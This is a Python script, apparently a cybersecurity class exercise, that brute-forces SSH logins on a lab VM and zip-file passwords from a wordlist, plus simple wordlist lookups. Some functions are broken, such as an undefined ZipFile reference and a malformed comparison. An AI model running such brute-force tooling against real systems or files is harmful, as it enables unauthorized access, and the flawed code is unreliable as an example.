#!/usr/bin/env python3

# Libraries
import time
import paramiko
import getpass
# from zipfile import ZipFile
import zipfile

# Script Name:                  ops401_challenge18.py
# Author:                       Michael Roberts 
# Date of latest revision:      01/31/2024
# Purpose:                      create a python script that can get file/string and compare it to output or get ssh client or unzip file
# Execution:			        have to run python3 ops401_challenge18.py
# Documentation                 roger huba's script at https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-17/challenges/DEMO.md helped on some lines 



def get_file():
    word_list = input('What is a good word list file path? ')
    return word_list

# loads an external word file and assigns the first 50 lines in it to a list
def load_ext_file(filepath):
    password_list = []
    with open(filepath, 'r') as file:
        x = 50
        for line in range(x):
            line = file.readline().rstrip()
            password_list.append(line)
            #time.sleep(1)
    return password_list

# checks for individual strings against a given filepath
def check_for_word(words):
    user_ans = input('Enter a word: ')
    lower_answer = user_ans.lower()
    if lower_answer in words:
        print('word is in dict')
    else:
        print('word not in dict')

# a good way to check this one is to use the same file that you used in the get_file the first time
# This takes two files and for every word in them it checks to see if the words match. 
def check_filepath(path):
    user_ans = get_file()
    with open(user_ans, 'r') as file:
        with open(path, 'r') as file2:
            for line in file:
                if line == line in file2:
                    print("string in file is in the pass file")
                else:
                    print('string in file is not in pass file')
                # time.sleep(1)    
                    
def get_host():
    # vm on lab pc
    ip = input("ssh client: ") or "192.168.1.144"
    return ip

def get_user():
    # username on vm
    user = input("user: ") or "ubuntuuser"
    return user

def get_pass(guess):
    # password on vm
    password = getpass.getpass(prompt="password: ") or guess
    return password

def unzip_zipfile(zipped_file, passwords):

    with ZipFile(zipped_file) as zf:
        zf.extractall(pwd=bytes(passwords,'utf-8'))
        print(f'the file {zipped_file} has been unzipped')


def ssh_connect(guessing):
    port = 22
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    checked_password = get_pass(guessing)
    try:
        ssh.connect(get_host(), port, get_user(), checked_password)
        stdin, stdout, stderr = ssh.exec_command("whoami")
        time.sleep(2)
        output = stdout.read()
        #print('-', * 50)
        print(output)
        stdin, stdout, stderr = ssh.exec_command("ls -l")
        time.sleep(2)
        output = stdout.read()
        print(output)
        stdin, stdout, stderr = ssh.exec_command("uptime")
        time.sleep(2)
        output = stdout.read()
        print(output)
        return True

    except paramiko.AuthenticationException as e:
        print('Authentication failed', e) 
    
    ssh.close()

if __name__ == "__main__":
    
    listed_words = get_file()
    # print(listed_words)
    passwords = load_ext_file(listed_words)
    load_ext_file(listed_words)
    while True:
        print('option 1:compare string\noption 2:compare string in filepath\noption 3: ssh check\noption 4: brute force zipped file')
        chk = int(input('option[1], option[2], option[3] or option[4]? '))
        if chk == int(1):
            check_for_word(passwords)
        elif chk == int(2):
            check_filepath(listed_words)
        elif chk == int(3):
            for word in passwords:
                if ssh_connect(word) == True:
                    break
        elif chk == int(4):
            zipped_file = input('what zip file to force? ')
            with open(listed_words, 'rb') as file:
                for word in file:
                    try:
                        with zipfile.ZipFile(zipped_file) as zf:
                            zf.extractall(pwd=word.strip())
                            print(f'password = {word.decode()}')
                            break 
                    except RuntimeError as e:
                        print(f'{e}')
                         
        like_to_continue = input("would you like to continue checking? ")
        
        if like_to_continue == str('yes') or like_to_continue == str('y'):
            continue
        else:
            break
    
